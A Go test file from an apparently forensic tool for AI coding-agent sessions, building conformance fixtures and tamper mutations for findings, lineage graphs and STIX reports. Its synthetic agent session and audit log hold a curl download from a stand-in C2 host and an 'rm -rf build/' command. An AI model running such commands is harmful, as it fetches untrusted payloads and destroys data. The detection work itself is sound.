package benchmark

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/efij/AgentDFIR/v4/internal/analysis"
	"github.com/efij/AgentDFIR/v4/internal/casepkg"
	"github.com/efij/AgentDFIR/v4/internal/export"
	"github.com/efij/AgentDFIR/v4/internal/overlay"
	"github.com/efij/AgentDFIR/v4/internal/repro"
)

// Spec 0.2.2 conformance fixtures for the optional analysis files: one
// analyzed package (testdata/conformance/analysis-valid) holding
// detections/analysis-manifest.json, detections/findings.json,
// normalized/lineage.json and reports/findings.stix.json as the tool
// wrote them (stored uncompressed so they diff; readers accept both
// forms), one with the graph as a pre-0.2.2 binary wrote it, and one
// analysis-invalid-<mutation> per inconsistency a verifier must catch.
// The sealed zone of each is valid: the verdict is about the analysis
// files alone.

// analysisMutation edits the analysis files of a copy of analysis-valid.
type analysisMutation struct {
	ID, What string
	Apply    func(pkg string) error
}

func editJSON(path string, fn func(v map[string]any) error) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	var v map[string]any
	if err := json.Unmarshal(data, &v); err != nil {
		return err
	}
	if err := fn(v); err != nil {
		return err
	}
	out, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, append(out, '\n'), 0o644)
}

func graphPath(p string) string    { return filepath.Join(p, "normalized", "lineage.json") }
func stixPath(p string) string     { return filepath.Join(p, filepath.FromSlash(repro.STIXReport)) }
func findingsPath(p string) string { return filepath.Join(p, "detections", "findings.json") }

func edges(v map[string]any) []map[string]any {
	var out []map[string]any
	for _, e := range v["edges"].([]any) {
		out = append(out, e.(map[string]any))
	}
	return out
}

func hasTelemetry(e map[string]any) bool {
	for _, r := range e["source_refs"].([]any) {
		if r.(map[string]any)["telemetry_ref"] != nil {
			return true
		}
	}
	return false
}

func stixObject(v map[string]any, typ string) (map[string]any, error) {
	for _, o := range v["objects"].([]any) {
		if m := o.(map[string]any); m["type"] == typ {
			return m, nil
		}
	}
	return nil, fmt.Errorf("fixture bundle has no %s", typ)
}

func analysisMutations() []analysisMutation {
	return []analysisMutation{
		{ID: "manifest-findings-edited", What: "change one finding's severity in findings.json after the analysis: the recomputed findings_fingerprint no longer matches", Apply: func(p string) error {
			data, err := os.ReadFile(findingsPath(p))
			if err != nil {
				return err
			}
			var fs []map[string]any
			if err := json.Unmarshal(data, &fs); err != nil || len(fs) == 0 {
				return fmt.Errorf("fixture has no findings: %v", err)
			}
			fs[0]["severity"] = "INFO"
			out, _ := json.MarshalIndent(fs, "", "  ")
			return os.WriteFile(findingsPath(p), append(out, '\n'), 0o644)
		}},
		{ID: "manifest-finding-dropped", What: "delete one finding from findings.json", Apply: func(p string) error {
			data, err := os.ReadFile(findingsPath(p))
			if err != nil {
				return err
			}
			var fs []any
			_ = json.Unmarshal(data, &fs)
			out, _ := json.MarshalIndent(fs[1:], "", "  ")
			return os.WriteFile(findingsPath(p), append(out, '\n'), 0o644)
		}},
		{ID: "manifest-fingerprint-edited", What: "replace findings_fingerprint in the manifest", Apply: func(p string) error {
			return editJSON(repro.Path(p), func(v map[string]any) error {
				v["findings_fingerprint"] = "sha256:" + strings.Repeat("0", 64)
				return nil
			})
		}},
		{ID: "manifest-findings-missing", What: "remove findings.json, so the fingerprint cannot be checked", Apply: func(p string) error {
			return os.Remove(findingsPath(p))
		}},
		{ID: "manifest-missing-tool", What: "remove the tool object from the manifest", Apply: func(p string) error {
			return editJSON(repro.Path(p), func(v map[string]any) error { delete(v, "tool"); return nil })
		}},
		{ID: "graph-dangling-edge", What: "point an edge at a node the graph does not hold", Apply: func(p string) error {
			return editJSON(graphPath(p), func(v map[string]any) error { edges(v)[0]["to"] = "file:/not/in/the/graph"; return nil })
		}},
		{ID: "graph-edge-no-source", What: "empty an edge's source_refs", Apply: func(p string) error {
			return editJSON(graphPath(p), func(v map[string]any) error { edges(v)[0]["source_refs"] = []any{}; return nil })
		}},
		{ID: "graph-corroborated-no-witness", What: "a CORROBORATED edge in a 0.2.2 graph that cites no telemetry record and states no limitation", Apply: func(p string) error {
			return editJSON(graphPath(p), func(v map[string]any) error {
				for _, e := range edges(v) {
					if e["evidence_state"] == "CORROBORATED" && !hasTelemetry(e) {
						delete(e, "limitations")
						return nil
					}
				}
				return fmt.Errorf("fixture graph has no CORROBORATED edge without telemetry")
			})
		}},
		{ID: "graph-correlated-no-telemetry", What: "remove the telemetry record from a correlated edge", Apply: func(p string) error {
			return editJSON(graphPath(p), func(v map[string]any) error {
				for _, e := range edges(v) {
					if _, ok := e["confidence"]; ok {
						var keep []any
						for _, r := range e["source_refs"].([]any) {
							if r.(map[string]any)["telemetry_ref"] == nil {
								keep = append(keep, r)
							}
						}
						e["source_refs"] = keep
						return nil
					}
				}
				return fmt.Errorf("fixture graph has no correlated edge")
			})
		}},
		{ID: "stix-indicator-no-pattern", What: "remove the required pattern from a STIX indicator", Apply: func(p string) error {
			return editJSON(stixPath(p), func(v map[string]any) error {
				o, err := stixObject(v, "indicator")
				if err == nil {
					delete(o, "pattern")
				}
				return err
			})
		}},
		{ID: "stix-dangling-ref", What: "a STIX relationship whose target is not in the bundle", Apply: func(p string) error {
			return editJSON(stixPath(p), func(v map[string]any) error {
				o, err := stixObject(v, "relationship")
				if err == nil {
					o["target_ref"] = "observed-data--00000000-0000-5000-8000-000000000000"
				}
				return err
			})
		}},
		{ID: "stix-bad-id", What: "a STIX note whose id is not note--<uuid>", Apply: func(p string) error {
			return editJSON(stixPath(p), func(v map[string]any) error {
				o, err := stixObject(v, "note")
				if err == nil {
					o["id"] = "note--not-a-uuid"
				}
				return err
			})
		}},
	}
}

// buildAnalysisReference collects and analyzes a small case with a second
// witness (an auditd log corroborating one command) and an IOC feed whose
// domain the transcript contacts, so the manifest, graph and bundle hold
// every element the checks look at.
func buildAnalysisReference(t *testing.T, work string) string {
	t.Helper()
	src := filepath.Join(work, "src")
	if err := os.MkdirAll(src, 0o755); err != nil {
		t.Fatal(err)
	}
	s := newSession("cccccccc-0001-4000-8000-000000000001", t0)
	s.user(0, "fetch the installer and clean the build")
	s.bash(2, "curl -s https://c2.conformance.example/drop.sh -o /tmp/drop.sh", "")
	s.bash(5, "rm -rf build/", "")
	transcript := filepath.Join(src, "session.jsonl")
	if err := os.WriteFile(transcript, s.bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	pkg := filepath.Join(work, "analysis.adfir")
	b, err := casepkg.New(pkg, "CONFORMANCE-ANALYSIS", casepkg.CaseInfo{OperatorOSUser: "benchmark"})
	if err != nil {
		t.Fatal(err)
	}
	if err := b.IngestFile(transcript, casepkg.ArtifactRecord{SourcePath: transcript, LogicalPath: ".claude/projects/-home-dev-app/session.jsonl",
		Product: "claude-code", ArtifactType: "transcript", CollectorRule: "claude.sessions"}); err != nil {
		t.Fatal(err)
	}
	if err := b.Seal(); err != nil {
		t.Fatal(err)
	}
	b.Close()
	at := func(sec float64) string { return fmt.Sprintf("%d.%03d", t0.Unix()+int64(sec), 300) }
	audit := filepath.Join(work, "audit.log")
	if err := os.WriteFile(audit, []byte(
		"type=SYSCALL msg=audit("+at(2)+":101): arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid=4411 uid=1000 comm=\"curl\" exe=\"/usr/bin/curl\"\n"+
			"type=EXECVE msg=audit("+at(2)+":101): argc=5 a0=\"curl\" a1=\"-s\" a2=\"https://c2.conformance.example/drop.sh\" a3=\"-o\" a4=\"/tmp/drop.sh\"\n"+
			"type=SYSCALL msg=audit("+at(5)+":102): arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid=4412 uid=1000 comm=\"rm\" exe=\"/bin/rm\"\n"+
			"type=EXECVE msg=audit("+at(5)+":102): argc=3 a0=\"rm\" a1=\"-rf\" a2=\"build/\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	feed := filepath.Join(work, "iocs.json")
	if err := os.WriteFile(feed, []byte(`{"pack":"conformance","version":"1","incidents":[{"id":"CONF-1","title":"Conformance incident",
"summary":"Synthetic incident for the conformance fixtures.","indicators":[{"kind":"domain","value":"c2.conformance.example"}]}]}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := analysis.Run(pkg, analysis.Options{EndpointLogs: []string{audit}, IOCFiles: []string{feed}}); err != nil {
		t.Fatal(err)
	}
	man, err := casepkg.ReadManifest(pkg)
	if err != nil {
		t.Fatal(err)
	}
	var in export.STIXInput
	in.CaseID, in.Findings = man.CaseID, analysis.LoadFindings(pkg)
	if data, err := overlay.ReadFile(filepath.Join(pkg, "detections", "hunt.json")); err == nil {
		_ = json.Unmarshal(data, &in.Hunt)
	}
	in.Created = t0
	if err := os.MkdirAll(filepath.Join(pkg, "reports"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := export.WriteSTIXBundle(in, stixPath(pkg)); err != nil {
		t.Fatal(err)
	}
	// Keep only the files under test, uncompressed; the input paths the
	// manifest recorded were temporary and are cut to their base names.
	findings, _ := overlay.ReadFile(findingsPath(pkg))
	graph, _ := overlay.ReadFile(graphPath(pkg))
	for _, d := range []string{"normalized", "index"} {
		_ = os.RemoveAll(filepath.Join(pkg, d))
	}
	keep := map[string]bool{repro.ManifestFile: true}
	entries, _ := os.ReadDir(filepath.Join(pkg, "detections"))
	for _, e := range entries {
		if !keep[e.Name()] {
			_ = os.Remove(filepath.Join(pkg, "detections", e.Name()))
		}
	}
	_ = os.MkdirAll(filepath.Join(pkg, "normalized"), 0o755)
	if err := os.WriteFile(findingsPath(pkg), findings, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(graphPath(pkg), graph, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := editJSON(repro.Path(pkg), func(v map[string]any) error {
		opts := v["options"].(map[string]any)
		for _, k := range []string{"endpoint_logs", "ioc_files"} {
			for _, f := range opts[k].([]any) {
				f.(map[string]any)["path"] = filepath.Base(f.(map[string]any)["path"].(string))
			}
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	return pkg
}

func writeAnalysisConformance(t *testing.T, write func(name string, e conformanceExpect, base string, mutate func(string) error)) {
	t.Helper()
	base := buildAnalysisReference(t, t.TempDir())
	write("analysis-valid", conformanceExpect{Verdict: "VERIFIED", Kind: "analysis",
		Description: "an analyzed package (second witness and an IOC hit): analysis-manifest.json whose findings_fingerprint matches findings.json, a 0.2.2 action graph, a STIX 2.1 bundle"}, base, nil)
	write("analysis-valid-pre022-graph", conformanceExpect{Verdict: "VERIFIED", Kind: "analysis",
		Description: "the same, with the action graph as a pre-0.2.2 binary wrote it (no adfir_spec, no limitations): still valid"}, base, func(p string) error {
		return editJSON(graphPath(p), func(v map[string]any) error {
			delete(v, "adfir_spec")
			for _, e := range edges(v) {
				delete(e, "limitations")
			}
			return nil
		})
	})
	for _, m := range analysisMutations() {
		m := m
		write("analysis-invalid-"+m.ID, conformanceExpect{Verdict: "FAILED", Kind: "analysis", Mutation: m.ID, Description: m.What}, base, m.Apply)
	}
}
